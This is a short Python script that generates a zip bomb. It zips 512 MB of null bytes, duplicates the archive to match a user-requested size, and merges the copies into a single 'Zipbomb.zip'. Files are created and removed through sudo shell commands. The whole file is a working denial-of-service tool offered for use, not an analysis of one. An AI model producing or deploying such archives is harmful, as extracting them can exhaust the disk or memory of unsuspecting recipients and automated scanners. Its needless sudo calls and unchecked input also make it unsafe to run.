#!/usr/bin/env python
import shutil,os
p=0
while(p<=0):
    p=input('Enter How Many Gb To Generate(Please enter a value greater than 0)\n')
#generating 512mb of data
file=open("zip.txt",'w+')
x="\x00"*1024*1024*512
file.write(x)
file.close()
#Zipping that txt file
os.system("sudo zip check1.zip zip.txt")
#Removinf the original txt file
os.system("sudo rm -r zip.txt")
cnt=2
if(p%2==1 and p!=1):
    siz=2*p-1
else:
    siz=2*p
#Duplicating the same zip file required times
while(cnt<=siz):
    s=str(cnt)
    dest="check"+s+".zip"
    shutil.copy("check1.zip",dest)
    cnt+=1
#Combinining all zip files and compressing them all to single zip file
os.system("sudo zip Zipbomb.zip *.zip")
cnt-=1
#Removing the generated zip files and keeping only the combined zip file
while(cnt>0):
    os.system("sudo rm -r check"+str(cnt)+".zip")
    cnt-=1
